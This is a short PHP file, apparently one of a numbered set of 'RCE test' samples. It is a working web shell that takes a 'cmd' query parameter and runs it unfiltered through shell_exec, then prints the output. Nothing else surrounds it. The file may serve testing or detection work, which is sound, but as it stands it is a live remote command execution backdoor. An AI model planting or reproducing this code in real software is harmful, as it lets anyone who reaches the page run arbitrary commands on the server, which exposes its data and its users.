<?php
// RCE test variation #553
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>